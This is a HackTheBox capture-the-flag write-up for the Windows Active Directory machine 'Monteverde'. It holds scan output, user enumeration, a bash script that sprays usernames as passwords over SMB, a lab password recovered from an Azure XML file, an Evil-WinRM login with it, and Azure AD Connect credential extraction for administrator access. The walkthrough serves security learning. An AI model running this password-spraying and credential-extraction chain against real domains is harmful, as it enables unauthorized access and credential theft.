# Montverde - HackTheBox WriteUp

![info](/images/monteverde/info.png)


## Enumeration & Information Gathering
 
#### Scanning 

Nmap Full scan:
```
root@kali:/monteverde# nmap -T4 -p0-65535 10.10.10.172
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-11 14:09 EST
Nmap scan report for 10.10.10.172
Host is up (0.14s latency).
Not shown: 65517 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49702/tcp open  unknown
49771/tcp open  unknown
```


Nmap Aggressive scan:
```
root@kali:/monteverde/nmap# nmap -A -p53,88,135,139,389,445,464,593,636,3269,5985,9389,49667,49669,49670,49702,49771 10.10.10.172 -oA services
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-11 14:22 EST
Nmap scan report for 10.10.10.172
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-11 19:33:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49771/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/11%Time=5E1A2089%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 10m39s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required --> relay attacks won't work
| smb2-time: 
|   date: 2020-01-11T19:36:07
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   54.47 ms  10.10.14.1
2   206.11 ms 10.10.10.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 343.36 seconds 
```
#### Service Enumeration 

**SMB:**
```
root@kali:/monteverde# smbclient -L \\\\10.10.10.172\\
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

```

After  unsuccessful tries with impacket GetNPUser.py and GetUserSPns.py (with password guessing) making a small list of password for guessing while continuing enumeration would be ideal.

Running Enum4linux to enumerate RPC and LDAP

> enum4linux 10.10.10.172 > mon_enum4linux.txt

There isin't much interesting information in the output apart from a list of usernames.
Collected and cleaning up the usernames section as this would be useful.

```
root@kali:/monteverde# cat user_clean.txt 
olearyNK
Administrator
AAD_987d7f2f57d2
mhope
smorgan
Administrator
krbtgt
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
olearyNK
smorgan
Guest
dgalanos
```

**Password Guessing (smbclient):**

Fom the list of users obtained from enum4linux, some service accounts can be seen/ Service accounts are usually primary targets as best practices are often ignored. See, Active direcory user account best practices
https://thycotic.com/company/blog/2020/01/14/service-account-best-practices-active-directory/ or other similar articles on "service account [password] best practices"

One of the common bad practices not mentioned in the article is the lazy sysadmin that sets the service account password the same as the username.

To quickly check, this I wrote a small bash script to authenticate with the password the same as the username

my_smbc_pass_guess.sh:

```
root@kali:/monteverde# cat my_smbc_pass_guess.sh 
#!/bin/bash

if [ "$#" -lt "2" ]; 
then
    echo "Usage: sh my_smbc_pass_guess.sh <ip_address> <path_to_usernames_file> [password]"  
    echo "Examples: "
    echo "sh my_smbc_pass_guess.sh 127.0.0.1 /root/usernames.txt"
    echo "sh my_smbc_pass_guess.sh 127.0.0.1 /root/usernames.txt password"
    exit 2
fi

ip=$1 # target ip address
users=$2 # file path to usernames

password="test"
echo $password

for user in $(cat $users)
do
# if 3rd arguement  is not supplied, runs with username as password
    if [ "$#" -eq "3" ];then
            password=$3
    elif [ "$#" -eq 2 ]; then
            password=$user
    fi
    echo "Trying with username:password ..." $user ":" $password
    smbclient -U=$user%$password -L \\\\$ip\\
done


Trying with username:password ... SABatchJobs : SABatchJobs

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        users$          Disk      
```


Sincerely, this could have easily been achieved using crackmap exec, howvever I wanted to practice a little bash scripting.

It appears that "SABatchJobs : SABatchJobs" are valid

## Exploitation 

#### Foothold 

SMB Authentication with user **SABatchJobs**, shows the user has access to azure_uploads and users$ share.


![shares_list_pass_guessed](/images/monteverde/shares_list_pass_guessed.png)

A list of directories named after the some users are seen in the porfiles share.

[users_share_dir_list](images/monteverde/users_share_dir_list)

After enumerating on the mhope directory contains a something interesting, a file name **azure.xml**.


Downloading this file and shecking its contents

```
cat /monteverde/azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```
![mhope_pass](/images/monteverde/mhope_pass.png)


Credentials found **mhope:4n0therD4y@n0th3r$**

#### Post Exploitation Enumeration 

Authnetication with these crdentials is possible via Windows Remote Management on port 5985 using Evil-WinRM

```
root@kali:~# evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents>
```

The first steps to take during privilege escalation is to check the actual privileges you have.

```
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Whoami /priv does not return any useful information. Running whoami /all would ouput all the information about the user including group, privs, claims etc.

```
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Noticing the user belongs to the **Azure Admins** group, next this is to search for privilege escalation methods for member of this group.


## Privilege Escalation  (Azure)

Azure AD enables password synchronization using the Azure AD Connect tool.

Members of "Azure Admins" can synchronize AD paswords. This is primarily used to ensure that passwords are updated when they are changed in one location (either in on-prem AD or in Azure AD).

Since this user has this ability, it is possible to read the administrator password using the sync mechanism.

Some good folks have already put up Poc's and a script to extract credentials.

https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1

After uploading this ADConnect script to the tartget

![upload_azure_module](/images/monteverde/upload_azure_module.png)

 Then running it, the administrator password is extracted.

![admin_creds](/images/monteverde/admin_creds.png)

The root flag can now be read.

![root](/images/monteverde/root.png)


**Conclusion:** 

This box was realtively easily, yet, stil offering things to learn such as the privilege escalition method via password synchronization in Azure AD.
Thank you for reading!

<img src="https://www.hackthebox.eu/badge/image/206328" alt="Hack The Box">
